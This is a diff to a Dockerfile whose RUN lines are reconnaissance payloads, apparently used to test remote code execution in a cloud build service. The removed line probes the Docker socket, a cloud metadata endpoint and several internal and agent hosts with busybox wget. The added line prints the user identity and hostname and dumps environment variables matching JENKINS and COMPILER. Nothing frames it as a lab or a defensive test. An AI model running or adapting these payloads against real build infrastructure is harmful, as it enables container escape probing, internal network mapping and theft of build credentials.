@@ -1,4 +1,4 @@
 FROM scratch
 ADD rootfs.tar /
-RUN /bin/sh -c 'id; echo jdr_rce_net_33707; cat /proc/1/cgroup | head -5; ls -la /var/run/docker.sock 2>&1 | head -2; echo "--- iface ---"; busybox ifconfig 2>/dev/null | head -8; echo "--- net hub-devops ---"; busybox wget -q -T 4 -O - http://hub-devops.jcloud.com/v2/ 2>&1 | head -c 200; echo; echo "--- net metadata ---"; busybox wget -q -T 4 -O - http://169.254.169.254/latest/meta-data/ 2>&1 | head -c 200; echo; echo "--- net localhost8082 ---"; busybox wget -q -T 3 -O - http://127.0.0.1:8082/script/build 2>&1 | head -c 300; echo; echo "--- net agentip ---"; busybox wget -q -T 3 -O - http://116.196.82.163:8082/script/build 2>&1 | head -c 300; echo; echo "--- net 172.19.4.92 ---"; busybox wget -q -T 3 -O - http://172.19.4.92/v2/ 2>&1 | head -c 200; echo'
+RUN /bin/sh -c 'id; echo FINAL_RCE_22063; cat /etc/hostname; whoami; env | grep -iE "COMPILER|JENKINS|PATH" | head -20'
 ENTRYPOINT ["/bin/sh","-c"]
